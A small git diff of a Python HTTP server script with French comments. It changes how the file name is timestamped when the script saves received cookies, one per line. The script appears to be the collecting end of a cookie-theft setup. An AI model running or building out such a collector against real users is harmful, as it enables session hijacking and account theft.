@@ -31,7 +31,10 @@ class MyServer(BaseHTTPRequestHandler):
         # On segmente les cookies pour chaque cookie
         cookies = cookies.split("%20")
         # On enregistre dans un fichier
-        nomFichier = cheminFichier.replace("DATE",str(datetime.now()))
+        nomFichier = cheminFichier.replace(
+            "DATE",
+            str(datetime.now().strftime("%Y-%m-%d-%H-%M-%S"))
+        )
         with open(nomFichier,"w") as fichier:
             for cookie in cookies:
                 fichier.write(cookie+"\n")
